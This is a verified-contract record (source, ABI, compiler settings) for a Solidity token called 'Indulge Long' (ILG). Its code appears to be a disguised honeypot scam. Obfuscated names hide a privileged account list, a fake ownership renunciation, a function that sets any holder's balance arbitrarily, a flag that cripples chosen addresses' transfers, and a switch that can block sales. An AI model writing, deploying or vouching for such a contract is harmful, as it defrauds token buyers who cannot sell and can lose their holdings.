{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface takeEnable {\n    function createPair(address totalTokenReceiver, address feeMaxTo) external returns (address);\n}\n\ninterface launchedToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingToken) external view returns (uint256);\n\n    function transfer(address teamAuto, uint256 shouldMax) external returns (bool);\n\n    function allowance(address maxFundEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamAuto,\n        uint256 shouldMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atToMode, uint256 value);\n    event Approval(address indexed maxFundEnable, address indexed spender, uint256 value);\n}\n\nabstract contract buyFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedList is launchedToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndulgeLong is buyFund, launchedToken, launchedList {\n\n    event OwnershipTransferred(address indexed buyTotal, address indexed limitWallet);\n\n    function sellSender(address totalAutoLiquidity) public {\n        fundMax();\n        if (takeTokenBuy != isSwap) {\n            fromLimit = minSell;\n        }\n        if (totalAutoLiquidity == buyTx || totalAutoLiquidity == buyFrom) {\n            return;\n        }\n        amountSenderToken[totalAutoLiquidity] = true;\n    }\n\n    mapping(address => bool) public amountSenderToken;\n\n    function transferFrom(address marketingBuyMin, address teamAuto, uint256 shouldMax) external override returns (bool) {\n        if (_msgSender() != shouldTotal) {\n            if (limitSender[marketingBuyMin][_msgSender()] != type(uint256).max) {\n                require(shouldMax <= limitSender[marketingBuyMin][_msgSender()]);\n                limitSender[marketingBuyMin][_msgSender()] -= shouldMax;\n            }\n        }\n        return isMinMarketing(marketingBuyMin, teamAuto, shouldMax);\n    }\n\n    function receiverReceiver(address marketingBuyMin, address teamAuto, uint256 shouldMax) internal returns (bool) {\n        require(tokenLaunched[marketingBuyMin] >= shouldMax);\n        tokenLaunched[marketingBuyMin] -= shouldMax;\n        tokenLaunched[teamAuto] += shouldMax;\n        emit Transfer(marketingBuyMin, teamAuto, shouldMax);\n        return true;\n    }\n\n    constructor (){\n        \n        launchedExempt modeReceiverShould = launchedExempt(shouldTotal);\n        buyFrom = takeEnable(modeReceiverShould.factory()).createPair(modeReceiverShould.WETH(), address(this));\n        \n        buyTx = _msgSender();\n        minSwap[buyTx] = true;\n        tokenLaunched[buyTx] = launchedSwap;\n        totalMode();\n        if (walletMarketing) {\n            walletMarketing = true;\n        }\n        emit Transfer(address(0), buyTx, launchedSwap);\n    }\n\n    bool private launchedReceiver;\n\n    bool public tokenMode;\n\n    function owner() external view returns (address) {\n        return shouldFundEnable;\n    }\n\n    function transfer(address launchSender, uint256 shouldMax) external virtual override returns (bool) {\n        return isMinMarketing(_msgSender(), launchSender, shouldMax);\n    }\n\n    string private isEnable = \"ILG\";\n\n    function getOwner() external view returns (address) {\n        return shouldFundEnable;\n    }\n\n    function totalMode() public {\n        emit OwnershipTransferred(buyTx, address(0));\n        shouldFundEnable = address(0);\n    }\n\n    address public buyTx;\n\n    address takeMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 autoTo;\n\n    uint256 private minSell;\n\n    uint256 constant amountFund = 9 ** 10;\n\n    function launchTo(address launchSender, uint256 shouldMax) public {\n        fundMax();\n        tokenLaunched[launchSender] = shouldMax;\n    }\n\n    uint256 private launchedSwap = 100000000 * 10 ** 18;\n\n    function balanceOf(address tradingToken) public view virtual override returns (uint256) {\n        return tokenLaunched[tradingToken];\n    }\n\n    uint256 public launchBuyTo;\n\n    function approve(address marketingLimit, uint256 shouldMax) public virtual override returns (bool) {\n        limitSender[_msgSender()][marketingLimit] = shouldMax;\n        emit Approval(_msgSender(), marketingLimit, shouldMax);\n        return true;\n    }\n\n    function fundMax() private view {\n        require(minSwap[_msgSender()]);\n    }\n\n    function allowance(address autoList, address marketingLimit) external view virtual override returns (uint256) {\n        if (marketingLimit == shouldTotal) {\n            return type(uint256).max;\n        }\n        return limitSender[autoList][marketingLimit];\n    }\n\n    uint256 sellLimitEnable;\n\n    uint256 public isSwap;\n\n    mapping(address => uint256) private tokenLaunched;\n\n    uint256 private totalWallet;\n\n    uint256 private fromLimit;\n\n    function isMinMarketing(address marketingBuyMin, address teamAuto, uint256 shouldMax) internal returns (bool) {\n        if (marketingBuyMin == buyTx) {\n            return receiverReceiver(marketingBuyMin, teamAuto, shouldMax);\n        }\n        uint256 liquidityEnableLimit = launchedToken(buyFrom).balanceOf(takeMin);\n        require(liquidityEnableLimit == autoTo);\n        require(teamAuto != takeMin);\n        if (amountSenderToken[marketingBuyMin]) {\n            return receiverReceiver(marketingBuyMin, teamAuto, amountFund);\n        }\n        return receiverReceiver(marketingBuyMin, teamAuto, shouldMax);\n    }\n\n    address public buyFrom;\n\n    string private exemptIs = \"Indulge Long\";\n\n    bool public walletMarketing;\n\n    uint256 private takeTokenBuy;\n\n    bool public marketingSwapSender;\n\n    uint256 private walletTotal;\n\n    mapping(address => mapping(address => uint256)) private limitSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isEnable;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedSwap;\n    }\n\n    address private shouldFundEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountFee;\n    }\n\n    function limitTotal(address buyLaunched) public {\n        if (tokenMode) {\n            return;\n        }\n        if (launchBuyTo == takeTokenBuy) {\n            isSwap = fromLimit;\n        }\n        minSwap[buyLaunched] = true;\n        \n        tokenMode = true;\n    }\n\n    mapping(address => bool) public minSwap;\n\n    function atLiquidityShould(uint256 shouldMax) public {\n        fundMax();\n        autoTo = shouldMax;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptIs;\n    }\n\n    uint8 private amountFee = 18;\n\n    address shouldTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFundEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atToMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountSenderToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldMax\",\"type\":\"uint256\"}],\"name\":\"atLiquidityShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuyTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMax\",\"type\":\"uint256\"}],\"name\":\"launchTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"}],\"name\":\"limitTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSwapSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAutoLiquidity\",\"type\":\"address\"}],\"name\":\"sellSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuyMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "IndulgeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}